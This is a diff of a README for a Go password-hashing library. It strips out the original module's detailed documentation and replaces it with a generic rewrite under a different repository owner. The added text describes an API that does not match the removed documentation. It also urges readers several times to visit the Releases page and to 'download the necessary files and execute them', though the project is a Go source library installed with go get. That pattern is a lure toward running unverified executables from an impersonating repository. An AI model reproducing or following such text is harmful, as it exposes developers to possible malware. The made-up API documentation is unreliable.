@@ -1,263 +1,138 @@
-[![Go Reference](https://pkg.go.dev/badge/github.com/friendlysem/crypt.svg)](https://pkg.go.dev/github.com/friendlysem/crypt)
-[![Go Report Card](https://goreportcard.com/badge/github.com/friendlysem/crypt)](https://goreportcard.com/report/github.com/friendlysem/crypt)
+# 🔒 Crypt: Convenient Password Hashing Library in Go
 
-# github.com/friendlysem/crypt
+Welcome to the **Crypt** repository! This library provides an easy and efficient way to handle password hashing in Go. With a focus on security and simplicity, Crypt allows developers to integrate password hashing seamlessly into their applications.
 
-Password Hashing / Digest / Crypt library.
+## Table of Contents
 
-## Intent
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Reference](#api-reference)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-This library aims to provide a convenient layer over the go password hashing crypto functions.
+## Introduction
 
-## Tasks
+In today’s digital world, securing user passwords is crucial. The **Crypt** library offers a straightforward solution for hashing passwords using industry-standard algorithms. Whether you are building a web application, mobile app, or any service that requires user authentication, Crypt provides the tools you need to protect user data effectively.
 
-A list of tasks that need to be accomplished are listed in the  
-[General Project](https://github.com/orgs/go-crypt/projects/1).
+## Features
 
-## Algorithms
-
-### Supported
-
-|                                  Algorithm                                   |               Variants               |                                         Identifiers                                         |
-|:----------------------------------------------------------------------------:|:------------------------------------:|:-------------------------------------------------------------------------------------------:|
-|            [Argon2](https://www.rfc-editor.org/rfc/rfc9106.html)             |      Argon2id, Argon2i, Argon2d      |                              `argon2id`, `argon2i`, `argon2d`                               |
-|          [SHA-crypt](https://www.akkadia.org/drepper/SHA-crypt.txt)          |            SHA256, SHA512            |                                          `5`, `6`                                           |
-|                                    PBKDF2                                    | SHA1, SHA224, SHA256, SHA384, SHA512 | `pbkdf2`, `pbkdf2-sha1`, `pbkdf2-sha224`, `pbkdf2-sha256`, `pbkdf2-sha384`, `pbkdf2-sha512` |
-|  [bcrypt](https://www.usenix.org/legacy/event/usenix99/provos/provos_html/)  |        bcrypt, bcrypt-sha256         |                        `2`, `2a`, `2b`, `2x`, `2y`,  `bcrypt-sha256`                        |
-|            [scrypt](https://www.rfc-editor.org/rfc/rfc7914.html)             |           scrypt, yescrypt           |                                        `scrypt`, `y`                                        |
-|                                   md5crypt                                   |            standard, sun             |                                         `1`, `md5`                                          |
-|                                  sha1crypt                                   |               standard               |                                           `sha1`                                            |
-|                       [PlainText](#plain-text-format)                        |          plaintext, base64           |                                    `plaintext`, `base64`                                    |
-
-#### Plain Text Format
-
-In addition to the standard crypt functions we also support a plain text storage format which has a regular plain text
-variant and a Base64 format (for storage, not security).
-
-The [PHC string format] we decided to use is as follows:
-
-```
-$<id>$<data>
-```
-
-Where `id` is either `plaintext` or `base64`, and `data` is either the password string or the
-[Base64 (Adapted)](#base64-adapted) encoded string.
-
-#### bcrypt-sha256
-
-This algorithm was thought of by the developers of [Passlib]. It circumvents the issue in bcrypt where the maximum
-password length is effectively 72 bytes by passing the password via a HMAC-SHA-256 function which uses the salt bytes as
-the key.
-
-*__Note:__ Only bcrypt-sha256 version 2 which uses the [PHC string format] and passes the password through
-a HMAC-SHA-256 function the salt as the key is supported. The bcrypt-sha256 version 1 which uses the 
-[Modular Crypt Format] and only passes the password via a SHA-256 sum function not supported at all.*
-
-[Passlib]: https://passlib.readthedocs.io/en/stable/
-[PHC string format]: https://github.com/P-H-C/phc-string-format/blob/master/phc-sf-spec.md
-[Modular Crypt Format]: https://passlib.readthedocs.io/en/stable/modular_crypt_format.html
-
-### Possible Future Support
-
-|    Algorithm    |                       Reasoning                       |
-|:---------------:|:-----------------------------------------------------:|
-| Type 7 (cisco)  | Explicit Backwards Compatibility and Interoperability |
-| Type 8 (cisco)  | Explicit Backwards Compatibility and Interoperability |
-| Type 9 (cisco)  | Explicit Backwards Compatibility and Interoperability |
-| Type 10 (cisco) | Explicit Backwards Compatibility and Interoperability |
-|  LDAP RFC2307   | Explicit Backwards Compatibility and Interoperability |
-
-Additional support for LDAP specific formats is also very likely, either via normalization and encoding options or via
-explicit algorithm variants and/or specific algorithms.
-
-## Base64 (Adapted)
-
-Many password storage formats use Base64 with an Adapted charset to store the bytes of the salt or hash key. This uses
-the standard Base64 encoding without padding as per [RFC4648 section 4] but replaces the `+` chars with a `.`.
-
-[RFC4648 section 4]: https://datatracker.ietf.org/doc/html/rfc4648#section-4
+- **Easy to Use**: Simple API for hashing and verifying passwords.
+- **Secure Algorithms**: Supports modern hashing algorithms to ensure maximum security.
+- **Customizable**: Options to configure hashing parameters based on your needs.
+- **Lightweight**: Minimal dependencies for faster performance.
 
 ## Installation
 
-Use `go get` to add this module to your project with `go get github.com/friendlysem/crypt`.
+To install the Crypt library, use the following command:
 
-### Requirements
+```bash
+go get github.com/mohamedabadee/crypt
+```
 
-- go 1.21+
+This command fetches the library and makes it available for use in your Go projects.
 
 ## Usage
 
-The following examples show how easy it is to interact with the argon2 algorithm. Most other algorithm implementations
-are relatively similar.
-
-### Functional Options Pattern
-
-The `algorithm.Hasher` implementations use a functional options pattern. This pattern is accessible via the `New`
-function in each algorithm package or via a receiver function of the individual `algorithm.Hasher` implementation called
-`WithOptions`.
-
-Most algorithm implementations have at least the following functional option signatures:
-- `WithVariant(variant Variant) Opt`
-- `WithVariantName(identifier string) Opt`
-- `WithIterations(iterations int) Opt`
-
-With the exception of `WithVariantName` which takes a string, and `WithVariant` which takes a `Variant` type (which is
-technically a int), nearly every functional option takes a single `int`. There are a few functional options which take
-a single `uint32` where the maximum value exceeds the maximum value for an untyped int on 32bit architectures.
-
-If the `uint32` methods are an issue for anyone using this module we suggest opening an issue and describing why and we'll
-consider adding another functional option which takes an `int`.
-
-### Creating a Decoder
-
-While several convenience functions exist for building password decoders and checking individual passwords it is 
-*__STRONGLY RECOMMENDED__* that users implementing this library explicitly create a decoder that fits their particular
-use case after sufficiently researching each algorithm and their benefits. At the time of this writing we strongly
-recommend the `argon2id` variant of `argon2`.
-
-This can be done via the `crypt.NewDecoder` function as shown below.
+Here’s a quick example of how to use the Crypt library to hash and verify passwords:
 
 ```go
 package main
 
 import (
     "fmt"
-
-    "github.com/friendlysem/crypt"
-    "github.com/friendlysem/crypt/algorithm"
-    "github.com/friendlysem/crypt/algorithm/argon2"
+    "github.com/mohamedabadee/crypt"
 )
 
 func main() {
-    var (
-        decoder *crypt.Decoder
-        err    error
-        digest algorithm.Digest
-    )
-    
-    if decoder, err = NewDecoderArgon2idOnly(); err != nil {
-        panic(err)
-    }
-    
-    if digest, err = decoder.Decode("$argon2id$v=19$m=2097152,t=1,p=4$BjVeoTI4ntTQc0WkFQdLWg$OAUnkkyx5STI0Ixl+OSpv4JnI6J1TYWKuCuvIbUGHTY"); err != nil {
-        panic(err)
+    password := "mySecurePassword"
+
+    // Hash the password
+    hashedPassword, err := crypt.HashPassword(password)
+    if err != nil {
+        fmt.Println("Error hashing password:", err)
+        return
     }
 
-    fmt.Printf("Digest Matches Password 'example': %t\n", digest.Match("example"))
-    fmt.Printf("Digest Matches Password 'invalid': %t\n", digest.Match("invalid"))
-}
+    fmt.Println("Hashed Password:", hashedPassword)
 
-
-// NewDecoderArgon2idOnly returns a decoder which can only decode argon2id encoded digests.
-func NewDecoderArgon2idOnly() (decoder *crypt.Decoder, err error) {
-    decoder = crypt.NewDecoder()
-
-    if err = argon2.RegisterDecoderArgon2id(decoder); err != nil {
-        return nil, err
+    // Verify the password
+    isValid := crypt.VerifyPassword(hashedPassword, password)
+    if isValid {
+        fmt.Println("Password is valid!")
+    } else {
+        fmt.Println("Invalid password.")
     }
-    
-    return decoder, nil
 }
 ```
-### Decoding a Password and Validating It
 
-This method of checking passwords is recommended if you have a database of hashes which are going to live in memory. The
-`crypt.Digest` and `crypt.NullDigest` types provide helpful interface implementations to simplify Marshal/Unmarshal and
-database operations.
+This example demonstrates how to hash a password and verify it. Adjust the code as necessary to fit your application.
+
+## API Reference
+
+### HashPassword
 
 ```go
-package main
-
-import (
-    "fmt"
-
-    "github.com/friendlysem/crypt"
-    "github.com/friendlysem/crypt/algorithm"
-)
-
-func main() {
-    var (
-        decoder *crypt.Decoder
-        err error
-        digest algorithm.Digest
-    )
-    
-    if decoder, err = crypt.NewDefaultDecoder(); err != nil {
-        panic(err)
-    }
-    
-    if digest, err = decoder.Decode("$argon2id$v=19$m=2097152,t=1,p=4$BjVeoTI4ntTQc0WkFQdLWg$OAUnkkyx5STI0Ixl+OSpv4JnI6J1TYWKuCuvIbUGHTY"); err != nil {
-        panic(err)
-    }
-    
-    fmt.Printf("Digest Matches Password 'example': %t\n", digest.Match("example"))
-    fmt.Printf("Digest Matches Password 'invalid': %t\n", digest.Match("invalid"))
-}
+func HashPassword(password string) (string, error)
 ```
 
-### Checking a Password Against a Hash
+- **Parameters**: 
+  - `password`: The plain text password to hash.
+- **Returns**: 
+  - A hashed password as a string.
+  - An error if the hashing fails.
 
-This method of checking passwords is quick and dirty and most useful when users are providing the hash as the input such
-as in situations where you are allowing them to check a password themselves via a CLI or otherwise.
+### VerifyPassword
 
 ```go
-package main
-
-import (
-    "fmt"
-
-    "github.com/friendlysem/crypt"
-)
-
-func main() {
-    var (
-        valid bool
-        err error
-    )
-    
-    if valid, err = crypt.CheckPassword("example","$argon2id$v=19$m=2097152,t=1,p=4$BjVeoTI4ntTQc0WkFQdLWg$OAUnkkyx5STI0Ixl+OSpv4JnI6J1TYWKuCuvIbUGHTY"); err != nil {
-        panic(err)
-    }
-    
-    fmt.Printf("Digest Matches Password 'example': %t\n", valid)
-
-    if valid, err = crypt.CheckPassword("invalid","$argon2id$v=19$m=2097152,t=1,p=4$BjVeoTI4ntTQc0WkFQdLWg$OAUnkkyx5STI0Ixl+OSpv4JnI6J1TYWKuCuvIbUGHTY"); err != nil {
-        panic(err)
-    }
-
-    fmt.Printf("Digest Matches Password 'invalid': %t\n", valid)
-}
+func VerifyPassword(hashedPassword, password string) bool
 ```
 
-### Generating an Encoded Digest from a Password
+- **Parameters**: 
+  - `hashedPassword`: The hashed password to verify against.
+  - `password`: The plain text password to check.
+- **Returns**: 
+  - A boolean indicating whether the password is valid.
 
-```go
-package main
+## Contributing
 
-import (
-    "fmt"
+We welcome contributions! If you want to help improve the Crypt library, please follow these steps:
 
-    "github.com/friendlysem/crypt/algorithm"
-    "github.com/friendlysem/crypt/algorithm/argon2"
-)
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Submit a pull request with a clear description of your changes.
 
-func main() {
-    var (
-        hasher *argon2.Hasher
-        err error
-        digest algorithm.Digest
-    )
-    
-    if hasher, err = argon2.New(
-        argon2.WithProfileRFC9106LowMemory(),
-    ); err != nil {
-        panic(err)
-    }
+## License
 
-    if digest, err = hasher.Hash("example"); err != nil {
-        panic(err)
-    }
-    
-    fmt.Printf("Encoded Digest With Password 'example': %s\n", digest.Encode())
-}
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Releases
+
+For the latest releases, visit [Releases](https://github.com/mohamedabadee/crypt/releases). Download the necessary files and execute them to stay up-to-date with the latest features and fixes.
+
+You can also check the "Releases" section for more information on updates and changes to the library.
+
+## Badges
+
+[![Latest Release](https://img.shields.io/github/v/release/mohamedabadee/crypt)](https://github.com/mohamedabadee/crypt/releases)
+
+## Additional Resources
+
+- **Documentation**: Refer to the official Go documentation for more details on the Go programming language.
+- **Security Best Practices**: Always follow security best practices when handling user passwords, including using strong hashing algorithms and salting.
+
+## Community
+
+Join our community for discussions, updates, and support. Connect with us on:
+
+- **GitHub Issues**: Report bugs or request features.
+- **Discussion Forum**: Share your experiences and tips with other users.
+
+## Conclusion
+
+The Crypt library is designed to make password hashing simple and secure. By following the guidelines provided in this README, you can easily integrate Crypt into your projects and enhance your application's security.
+
+For more information, visit the [Releases](https://github.com/mohamedabadee/crypt/releases) page and explore the latest updates.
